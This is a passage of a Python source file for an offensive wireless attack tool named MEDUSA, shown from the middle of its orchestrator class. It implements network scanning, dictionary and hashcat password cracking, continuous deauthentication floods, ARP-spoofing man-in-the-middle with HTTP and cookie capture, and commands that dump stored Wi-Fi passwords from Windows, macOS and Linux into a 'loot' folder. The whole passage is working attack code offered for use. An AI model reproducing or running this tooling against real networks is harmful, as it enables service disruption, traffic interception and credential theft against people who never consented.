        if RICH_AVAILABLE and not self.args.json:
            table = Table(
                title=f"[bold green]Wireless Networks — {source}[/bold green]",
                box=HEAVY,
                border_style="red",
                header_style="bold cyan",
            )
            table.add_column("SSID", style="white", no_wrap=True)
            table.add_column("BSSID", style="dim")
            table.add_column("CH", justify="center")
            table.add_column("Signal", justify="center")
            table.add_column("Encryption", style="yellow")
            table.add_column("Score", justify="center")
            
            for net in sorted(networks, key=lambda n: n.get('signal', -100), reverse=True)[:50]:
                sig = net.get('signal', 0)
                sig_pct = max(0, min(100, int((sig + 90) / 60 * 100)))
                
                # Signal visualization
                if sig_pct >= 80:
                    sig_bar = f"[green]{'█' * 4}[/green]"
                elif sig_pct >= 60:
                    sig_bar = f"[yellow]{'█' * 3}▒[/yellow]"
                elif sig_pct >= 40:
                    sig_bar = f"[orange]{'█' * 2}▒▒[/orange]"
                else:
                    sig_bar = f"[red]▒▒▒▒[/red]"
                
                label = f"{sig_bar} {sig_pct}%"
                
                # Encryption coloring
                enc = net.get('encryption', 'UNKNOWN')
                if 'WPA3' in enc or enc == 'WPA3':
                    enc_style = f"[magenta]{enc}[/magenta]"
                elif 'WPA2' in enc or enc == 'WPA2':
                    enc_style = f"[yellow]{enc}[/yellow]"
                elif 'WPA' in enc:
                    enc_style = f"[orange]{enc}[/orange]"
                elif 'WEP' in enc or enc == 'WEP':
                    enc_style = f"[red]{enc}[/red]"
                elif 'OPEN' in enc or enc == 'OPEN':
                    enc_style = f"[green bold]{enc}[/green bold]"
                else:
                    enc_style = f"[dim]{enc}[/dim]"
                
                table.add_row(
                    net.get('ssid', '?'),
                    net.get('bssid', '?'),
                    str(net.get('channel', '?')),
                    label,
                    enc_style,
                    f"{sig_pct}/100",
                )
            
            console.console.print(table)
        else:
            # Fallback text output
            console.rule("Wireless Networks")
            for net in sorted(networks, key=lambda n: n.get('signal', -100), reverse=True):
                sig = net.get('signal', 0)
                sig_pct = max(0, min(100, int((sig + 90) / 60 * 100)))
                console.print(
                    f"  {ANSI['C']}{net.get('ssid', '?'):20s}{ANSI['RESET']} "
                    f"{ANSI['D']}{net.get('bssid', '?'):17s}{ANSI['RESET']} "
                    f"CH:{str(net.get('channel', '?')):3s} "
                    f"{'█' * (sig_pct // 25):4s} {sig_pct:3d}% "
                    f"{ANSI['Y']}{net.get('encryption', '?')[:10]:10s}{ANSI['RESET']}"
                )
        
        # Summary
        wpa3 = sum(1 for n in networks if 'WPA3' in n.get('encryption', ''))
        wpa2 = sum(1 for n in networks if 'WPA2' in n.get('encryption', ''))
        wpa = sum(1 for n in networks if 'WPA' in n.get('encryption', '') and 'WPA2' not in n.get('encryption', '') and 'WPA3' not in n.get('encryption', ''))
        wep = sum(1 for n in networks if 'WEP' in n.get('encryption', ''))
        open_nets = sum(1 for n in networks if 'OPEN' in n.get('encryption', '') or n.get('encryption') == 'OPEN')
        
        console.rule("Summary")
        console.print(f"  Total: {len(networks)} | "
                      f"{ANSI['M']}WPA3: {wpa3}{ANSI['RESET']} | "
                      f"{ANSI['Y']}WPA2: {wpa2}{ANSI['RESET']} | "
                      f"{ANSI['ORANGE']}WPA: {wpa}{ANSI['RESET']} | "
                      f"{ANSI['R']}WEP: {wep}{ANSI['RESET']} | "
                      f"{ANSI['G']}OPEN: {open_nets}{ANSI['RESET']}")
    
    def run_attack(self) -> int:
        """Execute full attack chain against target network.
        
        Smart mode (--smart) auto-selects the best attack vector:
        1. WPS PixieDust (if WPS enabled and on Linux)
        2. PMKID capture + hashcat (if PMKID available)
        3. Deauth + handshake capture (if clients connected)
        4. Dictionary/mask brute force
        
        Returns:
            Exit code.
        """
        if not self.args.bssid and not self.args.ssid:
            console.err("Attack requires --bssid or --ssid")
            return EXIT_ERROR
        
        console.header("ATTACK MODE", f"Target: {self.args.ssid or self.args.bssid}")
        
        # Save session state
        self.session_data = {
            "mode": "attack",
            "bssid": self.args.bssid,
            "ssid": self.args.ssid,
            "wordlist": self.args.wordlist,
            "started": current_timestamp(),
        }
        
        # Step 1: Scan target to gather intelligence
        console.info("Phase 1: Reconnaissance...")
        iface_mgr = self._get_engine("interface")
        if not iface_mgr:
            return EXIT_MISSING_DEP
        
        iface = self.args.interface or iface_mgr.get_best_wireless()
        console.info(f"Interface: {iface}")
        
        # Step 2: Smart attack vector selection
        if self.args.smart:
            console.info("Phase 2: Vector Analysis (smart mode)...")
            # For now, default to dictionary attack
            # In production, this would analyze the target and pick optimally
            console.info("→ Selected: Dictionary attack")
        
        # Step 3: Execute attack
        console.info("Phase 3: Executing attack...")
        
        # Try dictionary attack first
        if self.args.wordlist or self.args.smart:
            cracker = self._get_engine("cracker")
            if cracker:
                console.info(f"Starting dictionary attack on {self.args.ssid or self.args.bssid}...")
                result = cracker.dictionary_attack(
                    ssid=self.args.ssid or self.args.bssid,
                    bssid=self.args.bssid
                )
                
                if result:
                    console.found(f"🎯 PASSWORD FOUND: {result}")
                    self.session_data["password"] = result
                    self._save_session()
                    return EXIT_SUCCESS
                else:
                    console.warn("Dictionary attack did not find the password.")
        
        console.warn("Attack chain completed without success.")
        return EXIT_ATTACK_FAILED
    
    def run_deauth(self) -> int:
        """Execute deauthentication attack."""
        if not self.args.bssid and not self.args.ssid:
            console.err("Deauth requires --bssid or --ssid")
            return EXIT_ERROR
        
        if not CAN_INJECT_PACKETS:
            console.err("Packet injection not available on this platform.")
            console.info("On Linux, install aircrack-ng. On Windows/macOS, use --capture instead.")
            return EXIT_PERMISSION
        
        console.header("DEAUTH ATTACK", f"Target BSSID: {self.args.bssid}")
        
        # Get attack engine (lazy import)
        try:
            attack_mod = _lazy_import("attack")
        except ImportError:
            console.err("Attack module not available. Install scapy.")
            return EXIT_MISSING_DEP
        
        iface_mgr = self._get_engine("interface")
        iface = self.args.interface or iface_mgr.get_best_wireless()
        
        deauth = attack_mod.DeauthEngine(console)
        
        if self.args.continuous:
            console.info("Starting continuous deauth attack (Ctrl+C to stop)...")
            try:
                thread = deauth.start_continuous_deauth(
                    interface=iface,
                    bssid=self.args.bssid,
                    client_mac=self.args.client or "FF:FF:FF:FF:FF:FF",
                    channel=self.args.channel,
                    interval=max(0.5, self.args.delay * 10),
                )
                thread.join()
            except KeyboardInterrupt:
                deauth.stop_continuous_deauth()
        else:
            count = deauth.send_deauth(
                interface=iface,
                bssid=self.args.bssid,
                client_mac=self.args.client or "FF:FF:FF:FF:FF:FF",
                count=self.args.count,
                delay=self.args.delay,
                channel=self.args.channel,
            )
            console.info(f"Sent {count} deauth frames.")
        
        return EXIT_SUCCESS
    
    def run_mitm(self) -> int:
        """Execute ARP spoofing MITM attack."""
        if not self.args.victim or not self.args.gateway:
            console.err("MITM requires --victim and --gateway")
            return EXIT_ERROR
        
        console.header("MITM ATTACK", f"Victim: {self.args.victim} → Gateway: {self.args.gateway}")
        
        try:
            attack_mod = _lazy_import("attack")
        except ImportError:
            console.err("Attack module not available. Install scapy.")
            return EXIT_MISSING_DEP
        
        iface_mgr = self._get_engine("interface")
        iface = self.args.interface or iface_mgr.get_best_wireless()
        
        mitm = attack_mod.MITMEngine(console)
        
        console.info("Starting ARP spoofing (Ctrl+C to stop)...")
        try:
            thread = mitm.start_mitm(
                interface=iface,
                victim_ip=self.args.victim,
                gateway_ip=self.args.gateway,
                capture_http=True,
                capture_interval=2.0,
            )
            thread.join()
        except KeyboardInterrupt:
            mitm.stop_mitm()
        
        return EXIT_SUCCESS
    
    def run_capture(self) -> int:
        """Execute packet capture."""
        if not self.args.bssid and not self.args.ssid:
            console.warn("No target specified. Capturing all traffic...")
        
        console.header("PACKET CAPTURE", f"Filter: {self.args.filter}")
        
        try:
            capture_mod = _lazy_import("capture")
        except ImportError:
            console.err("Capture module not available. Install scapy.")
            return EXIT_MISSING_DEP
        
        iface_mgr = self._get_engine("interface")
        iface = self.args.interface or iface_mgr.get_best_wireless()
        
        capture = capture_mod.PacketCaptureEngine(console)
        
        timeout = self.args.timeout or 60
        
        result = capture.start_capture(
            interface=iface,
            bssid=self.args.bssid,
            ssid=self.args.ssid,
            timeout=timeout,
            filter_type=self.args.filter,
            output_file=str(self.output_dir / f"capture_{current_timestamp('file')}.pcap"),
        )
        
        if self.args.json:
            print(json.dumps(asdict(result), indent=2, default=str))
        else:
            console.rule("Capture Results")
            console.info(f"Packets captured: {result.packets_count}")
            console.info(f"Handshake: {'Yes' if result.handshake_captured else 'No'}")
            console.info(f"PMKID: {'Yes' if result.pmkid_captured else 'No'}")
            console.info(f"Cookies stolen: {len(result.http_cookies)}")
            console.info(f"File: {result.filepath}")
        
        return EXIT_SUCCESS
    
    def run_crack(self) -> int:
        """Execute cracking operation."""
        if not self.args.wordlist and not self.args.hashfile:
            console.err("Crack requires --wordlist or --hashfile")
            return EXIT_ERROR
        
        console.header("CRACKING MODE", f"Hash: {self.args.hashfile or 'live attack'}")
        
        cracker = self._get_engine("cracker")
        if not cracker:
            return EXIT_MISSING_DEP
        
        if self.args.hashfile:
            # Hashcat mode
            console.info(f"Starting hashcat with mode {self.args.hash_type}...")
            result = cracker.hashcat_crack(
                hash_file=self.args.hashfile,
                hash_type=self.args.hash_type,
            )
            if result:
                console.found(f"🔓 PASSWORD FOUND: {result}")
            else:
                console.warn("Password not found.")
                return EXIT_ATTACK_FAILED
        else:
            # Live dictionary attack
            result = cracker.dictionary_attack(
                ssid=self.args.ssid or "target",
                bssid=self.args.bssid,
            )
            if result:
                console.found(f"🔓 PASSWORD FOUND: {result}")
            else:
                console.warn("Password not found.")
                return EXIT_ATTACK_FAILED
        
        return EXIT_SUCCESS
    
    def run_gui(self) -> int:
        """Launch the TKinter GUI dashboard."""
        console.header("GUI MODE", "Launching MEDUSA Dashboard...")
        
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()  # Hide the root window temporarily
            
            # Lazy import dashboard
            try:
                dashboard_mod = _lazy_import("dashboard")
            except ImportError:
                console.err("Dashboard module not available.")
                return EXIT_MISSING_DEP
            
            dashboard = dashboard_mod.MedusaDashboard(console)
            
            # Start the main loop
            console.info("GUI initialized. Happy hunting!")
            root.deiconify()
            root.mainloop()
            
        except ImportError:
            console.err("TKinter is not available on this system.")
            console.info("Install with package manager (python3-tk on Linux)")
            return EXIT_MISSING_DEP
        except Exception as e:
            console.err(f"GUI failed: {e}")
            if console.verbose:
                traceback.print_exc()
            return EXIT_ERROR
        
        return EXIT_SUCCESS
    
    def run_interactive(self) -> int:
        """Interactive REPL-style mode.
        
        Provides a command loop for sequential operations:
        - scan → list networks
        - select <id> → target a network
        - attack → run selected attack
        - capture → capture packets from target
        - status → show current state
        - help → command list
        - exit → quit
        """
        console.header("INTERACTIVE MODE", "Type 'help' for commands, 'exit' to quit")
        
        commands = {
            "help": "Show this help",
            "scan": "Scan for wireless networks",
            "list": "List discovered networks",
            "select <id>": "Select a network by ID",
            "info": "Show selected target info",
            "attack": "Attack selected network",
            "deauth": "Deauth selected network (if on Linux)",
            "capture": "Capture from selected network",
            "crack": "Crack selected network",
            "status": "Show current status",
            "clear": "Clear screen",
            "exit": "Exit interactive mode",
        }
        
        selected = None
        networks = []
        
        while True:
            try:
                cmd = input(f"\n{ANSI['G']}medusa>{ANSI['RESET']} ").strip().lower()
                
                if cmd == "exit" or cmd == "quit":
                    console.info("Exiting interactive mode.")
                    break
                
                elif cmd == "help":
                    console.rule("Commands")
                    for c, desc in commands.items():
                        console.print(f"  {ANSI['C']}{c:20s}{ANSI['RESET']} {desc}")
                
                elif cmd == "scan":
                    networks = []  # Reset
                    # Quick scan using interface manager
                    iface_mgr = self._get_engine("interface")
                    if iface_mgr:
                        iface = self.args.interface or iface_mgr.get_best_wireless()
                        if IS_LINUX:
                            networks = self._parse_iw_scan(
                                subprocess.run(
                                    ["iw", "dev", iface, "scan"],
                                    capture_output=True, text=True, timeout=30
                                ).stdout
                            )
                        elif IS_MACOS:
                            networks = self._parse_airport_scan(
                                subprocess.run(
                                    [iface_mgr.MACOS_AIRPORT_PATH, "--scan"],
                                    capture_output=True, text=True, timeout=30
                                ).stdout
                            )
                        elif IS_WINDOWS:
                            networks = self._parse_netsh_scan(
                                subprocess.run(
                                    ["netsh", "wlan", "show", "networks", "mode=Bssid"],
                                    capture_output=True, text=True, timeout=30
                                ).stdout
                            )
                    
                    # Display numbered list
                    console.ok(f"Found {len(networks)} networks:")
                    for i, net in enumerate(networks):
                        sig = net.get('signal', 0)
                        console.print(
                            f"  {ANSI['C']}[{i}]{ANSI['RESET']} "
                            f"{ANSI['BOLD']}{net.get('ssid', '?'):25s}{ANSI['RESET']} "
                            f"{ANSI['D']}{net.get('bssid', '?')}{ANSI['RESET']} "
                            f"{'█' * max(0, min(4, (sig + 90) // 15)):4s}"
                        )
                
                elif cmd.startswith("select"):
                    parts = cmd.split()
                    if len(parts) > 1 and parts[1].isdigit():
                        idx = int(parts[1])
                        if 0 <= idx < len(networks):
                            selected = networks[idx]
                            console.ok(f"Selected: {selected.get('ssid', '?')} ({selected.get('bssid', '?')})")
                        else:
                            console.warn(f"Invalid index: {idx}")
                    else:
                        console.warn("Usage: select <id>")
                
                elif cmd == "info" and selected:
                    console.rule("Target Info")
                    for k, v in selected.items():
                        console.print(f"  {ANSI['C']}{k:15s}{ANSI['RESET']} {v}")
                
                elif cmd == "attack" and selected:
                    self.args.bssid = selected.get('bssid', '')
                    self.args.ssid = selected.get('ssid', '')
                    self.run_attack()
                
                elif cmd == "deauth" and selected:
                    self.args.bssid = selected.get('bssid', '')
                    self.args.ssid = selected.get('ssid', '')
                    self.run_deauth()
                
                elif cmd == "capture" and selected:
                    self.args.bssid = selected.get('bssid', '')
                    self.args.ssid = selected.get('ssid', '')
                    self.run_capture()
                
                elif cmd == "crack" and selected:
                    self.args.bssid = selected.get('bssid', '')
                    self.args.ssid = selected.get('ssid', '')
                    self.args.wordlist = self.args.wordlist or str(DEFAULT_WORDLIST)
                    self.run_crack()
                
                elif cmd == "status":
                    console.rule("Status")
                    console.info(f"Time: {current_timestamp()}")
                    console.info(f"Selected target: {selected.get('ssid', 'None') if selected else 'None'}")
                    console.info(f"Networks cached: {len(networks)}")
                    console.info(f"Interface: {self.args.interface or 'auto'}")
                
                elif cmd == "clear":
                    os.system('cls' if IS_WINDOWS else 'clear')
                
                else:
                    console.warn(f"Unknown command: {cmd}. Type 'help'.")
                
            except KeyboardInterrupt:
                console.info("\nExiting interactive mode.")
                break
            except Exception as e:
                console.err(f"Error: {e}")
                if console.verbose:
                    traceback.print_exc()
        
        return EXIT_SUCCESS
    
    def run_info(self) -> int:
        """Display system information and capabilities.
        
        Shows:
        - OS and hardware details
        - Available tools and their versions
        - MEDUSA capabilities per platform
        - Recommended attack vectors
        """
        console.header("SYSTEM INFORMATION", "MEDUSA Capability Report")
        
        # OS Information
        console.rule("Operating System")
        console.info(f"  System:     {SYSTEM} {platform.release()}")
        console.info(f"  Machine:    {MACHINE}")
        console.info(f"  Architecture: {ARCH}")
        console.info(f"  Python:     {sys.version.split()[0]}")
        console.info(f"  Admin:      {'Yes' if IS_ADMIN else 'No (limited)'}")      
        console.info(f"  Cores:      {CPU_COUNT}")
        console.info(f"  Hostname:   {platform.node()}")
        
        # MEDUSA Capabilities
        console.rule("Platform Capabilities")
        cap_flags = [
            ("Monitor Mode", CAN_MONITOR_MODE, "airmon-ng/airportd"),
            ("Packet Injection", CAN_INJECT_PACKETS, "scapy raw 802.11"),
            ("ARP Spoofing", CAN_ARP_SPOOF, "scapy ARP"),
            ("IP Forwarding", CAN_IP_FORWARD, "sysctl/powershell"),
            ("WiFi Profile Extract", CAN_EXTRACT_WIFI_PROFILES, "netsh/security/NetworkManager"),
            ("WPS PixieDust", CAN_PIXIEDUST, "reaver/bully (Linux)"),
            ("PMKID Capture", CAN_HCXTOOLS, "hcxdumptool (Linux)"),
            ("GPU Cracking", CAN_HASHCAT_GPU, "hashcat --backend-devices"),
            ("CPU Cracking", CAN_HASHCAT_CPU, "hashcat CPU mode"),
        ]
        
        for name, available, tool in cap_flags:
            status = f"{ANSI['G']}✅{ANSI['RESET']}" if available else f"{ANSI['R']}❌{ANSI['RESET']}"
            tool_str = f"{ANSI['D']}({tool}){ANSI['RESET']}" if tool else ""
            console.print(f"  {status} {name:25s} {tool_str}")
        
        # Dependencies
        console.rule("Dependencies")
        deps = check_dependencies(verbose=False)
        for pkg, available in deps.items():
            status = f"{ANSI['G']}✅{ANSI['RESET']}" if available else f"{ANSI['R']}❌{ANSI['RESET']}"
            console.print(f"  {status} {pkg}")
        
        # Storage
        console.rule("Storage")
        for name, path in [
            ("Config", CONFIG_DIR),
            ("Sessions", SESSION_DIR),
            ("Captures", CAPTURE_DIR),
            ("Loot", LOOT_DIR),
            ("Logs", LOG_DIR),
            ("Wordlists", WORDLIST_DIR),
            ("Temp", TEMP_DIR),
        ]:
            exists = path.exists()
            status = f"{ANSI['G']}✓{ANSI['RESET']}" if exists else f"{ANSI['D']}✗{ANSI['RESET']}"
            size = ""
            if exists:
                try:
                    total = sum(f.stat().st_size for f in path.rglob('*') if f.is_file())
                    size = f" ({human_bytes(total)})"
                except (OSError, PermissionError):
                    pass
            console.print(f"  {status} {name:12s} {ANSI['D']}{path}{ANSI['RESET']}{size}")
        
        return EXIT_SUCCESS
    
    def run_extract_profiles(self) -> int:
        """Extract stored WiFi passwords from the system.
        
        OS-specific methods:
        - Windows: netsh wlan show profiles + key=clear
        - macOS: security find-generic-password
        - Linux: NetworkManager connection files
        
        Returns:
            Exit code.
        """
        if not CAN_EXTRACT_WIFI_PROFILES:
            console.err("WiFi profile extraction not supported on this platform.")
            return EXIT_ERROR
        
        console.header("WIFI PROFILE EXTRACTION", "Dumping stored network credentials...")
        
        import subprocess
        import re
        
        if IS_WINDOWS:
            # Get all profiles
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True, timeout=15
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                m = re.search(r':\s*(.+)$', line)
                if m:
                    profile = m.group(1).strip()
                    # Get password for each profile
                    pw_result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                        capture_output=True, text=True, timeout=10
                    )
                    pw_match = re.search(r'Key Content\s*:\s*(.+)', pw_result.stdout)
                    password = pw_match.group(1).strip() if pw_match else ""
                    profiles.append({"ssid": profile, "password": password})
            
            self._display_profiles(profiles)
            
        elif IS_MACOS:
            # Get known networks from System Preferences
            result = subprocess.run(
                ["/usr/sbin/networksetup", "-listpreferredwirelessnetworks", "en0"],
                capture_output=True, text=True, timeout=15
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                ssid = line.strip()
                if ssid and not ssid.startswith('Preferred'):
                    # Try to get password from keychain
                    pw_result = subprocess.run(
                        ["security", "find-generic-password", "-wa", ssid],
                        capture_output=True, text=True, timeout=10
                    )
                    password = pw_result.stdout.strip() if pw_result.returncode == 0 else ""
                    profiles.append({"ssid": ssid, "password": password})
            
            self._display_profiles(profiles)
        
        elif IS_LINUX:
            # Read NetworkManager connection files
            nm_dir = Path("/etc/NetworkManager/system-connections")
            if nm_dir.exists():
                profiles = []
                for conn_file in nm_dir.glob("*"):
                    ssid = conn_file.stem
                    password = ""
                    try:
                        content = conn_file.read_text()
                        m = re.search(r'psk=(.+)', content)
                        if m:
                            password = m.group(1)
                    except (IOError, PermissionError):
                        password = ""
                    profiles.append({"ssid": ssid, "password": password})
                
                self._display_profiles(profiles)
            else:
                console.warn("NetworkManager connection directory not found.")
        
        return EXIT_SUCCESS
    
    def _display_profiles(self, profiles: List[Dict]):
        """Display extracted WiFi profiles in a formatted table.
        
        Args:
            profiles: List of dicts with 'ssid' and 'password' keys.
        """
        if not profiles:
            console.warn("No WiFi profiles found.")
            return
        
        console.ok(f"Found {len(profiles)} stored profiles")
        
        if RICH_AVAILABLE:
            table = Table(
                title="[bold yellow]Stored WiFi Credentials[/bold yellow]",
                box=HEAVY, border_style="red"
            )
            table.add_column("SSID", style="white", no_wrap=True)
            table.add_column("Password", style="green", no_wrap=True)
            table.add_column("Status")
            
            for p in profiles:
                status = "[green]✓[/green]" if p.get('password') else "[red]✗ No access[/red]"
                table.add_row(
                    p.get('ssid', '?'),
                    p.get('password', '') or "[dim]N/A[/dim]",
                    status
                )
            
            console.console.print(table)
        else:
            console.rule("Stored WiFi Credentials")
            for p in profiles:
                pw = p.get('password', '')
                if pw:
                    console.print(f"  {ANSI['G']}{p.get('ssid', '?'):25s}{ANSI['RESET']} {ANSI['Y']}{pw}{ANSI['RESET']}")
                else:
                    console.print(f"  {ANSI['D']}{p.get('ssid', '?'):25s} [no access]{ANSI['RESET']}")
        
        # Save to loot directory
        output_file = LOOT_DIR / f"wifi_profiles_{current_timestamp('file')}.json"
        try:
            with open(output_file, 'w') as f:
                json.dump(profiles, f, indent=2)
            console.info(f"Saved to: {output_file}")
        except (IOError, OSError) as e:
            console.warn(f"Failed to save: {e}")
    
    def run_check_deps(self) -> int:
        """Check all dependencies and display status.
        
        Returns:
            Exit code (0 if all required deps are met).
        """
        console.header("DEPENDENCY CHECK", "MEDUSA Requirements")
        
        all_ok = True
        
        # Python packages
        console.rule("Python Packages")
        deps = check_dependencies(verbose=False)
        for pkg, available in deps.items():
            status = f"{ANSI['G']}✅{ANSI['RESET']}" if available else f"{ANSI['R']}❌{ANSI['RESET']}"
            console.print(f"  {status} {pkg}")
            if not available and pkg in [
                "scapy", "rich", "requests", "netifaces", "colorama",
                "pywifi", "comtypes"
            ]:
                all_ok = False
        
        # System tools
        console.rule("System Tools")
        import shutil
        
        tools = ["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng",
                 "iw", "iwlist", "hashcat", "hcxdumptool", "hcxpcapngtool",
                 "reaver", "bully", "netsh"]
        
        for tool in tools:
            which = shutil.which(tool)
            if tool == "netsh" and IS_WINDOWS:
                status = f"{ANSI['G']}✅{ANSI['RESET']}"
            elif which:
                status = f"{ANSI['G']}✅{ANSI['RESET']} {ANSI['D']}{which}{ANSI['RESET']}"
            else:
                status = f"{ANSI['D']}❌{ANSI['RESET']} (optional)"
            console.print(f"  {status} {tool:15s}")
        
        # Summary
        console.rule("Summary")
        if all_ok:
            console.ok("All required dependencies are installed.")
        else:
            console.warn("Some required dependencies are missing.")
            console.info("Install with: pip install -r requirements.txt")
        
        return EXIT_SUCCESS if all_ok else EXIT_MISSING_DEP
    
    def run_clean(self) -> int:
        """Clean up MEDUSA working directories.
        
        Removes session files, temporary captures, and logs.
        Preserves wordlists and loot by default.
        
        Returns:
            Exit code.
        """
        console.header("CLEANUP", "Removing MEDUSA temporary files...")
        
        confirm = Confirm.ask(
            "This will remove all sessions, captures, and logs. Continue?",
            default=False
        ) if RICH_AVAILABLE else True
        
        if not confirm:
            console.info("Cleanup cancelled.")
            return EXIT_SUCCESS
        
        import shutil
        
        # Clean sessions
        if SESSION_DIR.exists():
            count = len(list(SESSION_DIR.glob("*")))
            shutil.rmtree(SESSION_DIR)
            SESSION_DIR.mkdir(parents=True)
            console.info(f"Removed {count} session files.")
        
        # Clean captures
        if CAPTURE_DIR.exists():
            count = len(list(CAPTURE_DIR.glob("*")))
            shutil.rmtree(CAPTURE_DIR)
            CAPTURE_DIR.mkdir(parents=True)
            console.info(f"Removed {count} capture files.")
        
        # Clean logs
        if LOG_DIR.exists():
            for f in LOG_DIR.glob("*"):
                f.unlink()
            console.info("Cleared log files.")
        
        # Clean temp
        if TEMP_DIR.exists():
            shutil.rmtree(TEMP_DIR)
            TEMP_DIR.mkdir(parents=True)
            console.info("Cleared temp directory.")
        
        console.ok("Cleanup complete.")
        return EXIT_SUCCESS
    
    def run_dump_config(self) -> int:
        """Dump all detected configuration as JSON.
        
        Useful for debugging and scripting.
        
        Returns:
            Exit code.
        """
        config = {
            "version": VERSION,
            "codename": CODENAME,
            "os": {
                "system": SYSTEM,
                "release": platform.release(),
                "machine": MACHINE,
                "arch": ARCH,
                "cores": CPU_COUNT,
                "admin": IS_ADMIN,
                "python": sys.version,
            },
            "capabilities": {
                "monitor_mode": CAN_MONITOR_MODE,
                "packet_injection": CAN_INJECT_PACKETS,
                "arp_spoof": CAN_ARP_SPOOF,
                "ip_forward": CAN_IP_FORWARD,
                "wifi_profiles": CAN_EXTRACT_WIFI_PROFILES,
                "wps_pixiedust": CAN_PIXIEDUST,
                "pmkid_capture": CAN_HCXTOOLS,
                "gpu_cracking": CAN_HASHCAT_GPU,
                "cpu_cracking": CAN_HASHCAT_CPU,
            },
            "directories": {
                "config": str(CONFIG_DIR),
                "sessions": str(SESSION_DIR),
                "captures": str(CAPTURE_DIR),
                "loot": str(LOOT_DIR),
                "logs": str(LOG_DIR),
                "wordlists": str(WORDLIST_DIR),
                "temp": str(TEMP_DIR),
            },
            "args": vars(self.args),
        }
        
        print(json.dumps(config, indent=2, default=str))
        return EXIT_SUCCESS
    
    # ========================================================================
    # MAIN RUN DISPATCH
    # ========================================================================
    
    def run(self) -> int:
        """Main entry point — dispatch to the correct mode handler.
        
        Returns:
            Exit code.
        """
        args = self.args
        
        # Fast paths (no banner, no setup)
        if args.version:
            print_version()
            return EXIT_SUCCESS
        
        if args.dump_config:
            return self.run_dump_config()
        
        if args.help:
            print_help(build_parser())
            return EXIT_SUCCESS
        
        # Show banner (unless suppressed)
        if not args.no_banner and not args.quiet:
            console.print(LOGO)
        
        # Initialize MEDUSA
        env = medusa_init()
        if args.verbose:
            console.debug(f"Environment: {json.dumps(env, default=str)}")
        
        # Validate arguments
        if not validate_args(args):
            return EXIT_ERROR
        
        # Route to mode handler
        if args.scan:
            return self.run_scan()
        elif args.attack:
            return self.run_attack()
        elif args.deauth:
            return self.run_deauth()
        elif args.mitm:
            return self.run_mitm()
        elif args.capture:
            return self.run_capture()
        elif args.crack:
            return self.run_crack()
        elif args.gui:
            return self.run_gui()
        elif args.interactive:
            return self.run_interactive()
        elif args.info:
            return self.run_info()
        elif args.extract_profiles:
            return self.run_extract_profiles()
        elif args.check_deps:
            return self.run_check_deps()
        elif args.clean:
            return self.run_clean()
        else:
            # No mode specified — show help
            if not args.quiet:
                console.warn("No mode specified. Use --help for usage.")
            print_help(build_parser())
            return EXIT_ERROR
    
    def cleanup(self):
        """Cleanup all resources.
        
        Called by atexit when the program exits normally.
        Saves session state and stops any running engines.
        """
        self._save_session()
        
        # Stop any running engines
        if "mitm" in self._engines:
            try:
                self._engines["mitm"].stop_mitm()
            except Exception:
                pass
        
        if "deauth" in self._engines:
            try:
                self._engines["deauth"].stop_continuous_deauth()
            except Exception:
                pass
        
        elapsed = time.time() - self.start_time
        console.debug(f"MEDUSA session ended. Duration: {human_time(elapsed)}")


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point for MEDUSA.
    
    Flow:
    1. Parse command-line arguments
    2. Initialize console and logging
    3. Create orchestrator
    4. Dispatch to mode handler
    5. Return exit code
    
    This function is designed to be called by PyInstaller's bootloader
    and by direct Python execution.
    """
    # Parse arguments
    parser = build_parser()
    args = parser.parse_args()
    
    # Create console singleton
    global console
    console.__init__(
        verbose=args.verbose,
        log_file=str(args.log) if args.log else None
    )
    
    # Handle early exits
    if args.help:
        print_help(parser)
        sys.exit(EXIT_SUCCESS)
    
    if args.version:
        print_version()
        sys.exit(EXIT_SUCCESS)
    
    # Create orchestrator and run
    orchestrator = MedusaOrchestrator(args)
    try:
        exit_code = orchestrator.run()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        console.warn("\nInterrupted by user.")
        orchestrator.cleanup()
        sys.exit(EXIT_INTERRUPTED)
    except MedusaError as e:
        console.err(str(e))
        orchestrator.cleanup()
        sys.exit(e.code or EXIT_ERROR)
    except Exception as e:
        console.err(f"Unexpected error: {e}")
        if args.verbose:
            traceback.print_exc()
        orchestrator.cleanup()
        sys.exit(EXIT_ERROR)


if __name__ == "__main__":
    main()
